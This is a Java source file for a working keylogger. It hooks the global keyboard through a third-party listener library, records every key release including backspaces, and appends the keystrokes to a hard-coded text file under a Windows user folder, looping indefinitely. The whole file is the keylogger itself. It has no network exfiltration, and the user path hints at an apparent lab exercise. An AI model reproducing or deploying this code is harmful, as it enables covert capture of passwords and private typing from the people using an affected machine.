import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

import de.ksquared.system.keyboard.GlobalKeyListener;
import de.ksquared.system.keyboard.KeyAdapter;
import de.ksquared.system.keyboard.KeyEvent;

public class keylog {
   
   
   public static void main(String[] args) {
      new GlobalKeyListener().addKeyListener(new KeyAdapter() {
         //@Override public void keyPressed(KeyEvent event) { System.out.println(event); }
         @Override public void keyReleased(KeyEvent event) {
            String temp2;
        	char temp;
        	
        	 if(event.getVirtualKeyCode() ==8){ //backspaceŰ
            	temp2 = "(backspace)";
            }else{
        	 temp = (char)event.getVirtualKeyCode();
        	 temp2 = String.valueOf(temp);
            }
        	
        	 File file = new File("C:\\Users\\jungbo4-01\\test\\test.txt");
            FileWriter fw;
            BufferedWriter bw = null;
            try {
               fw = new FileWriter(file, true);
               bw = new BufferedWriter(fw);
               bw.write(temp2);
            } catch (IOException e) {e.printStackTrace();
            } finally{
               try {
                  bw.close();
               } catch (IOException e) {
                  // TODO Auto-generated catch block
                  e.printStackTrace();
               }
            }
            
            System.out.println(event.getVirtualKeyCode());
            
         }
      });
      while(true)
         try { Thread.sleep(100); }
         catch(InterruptedException e) { e.printStackTrace(); }
   }
}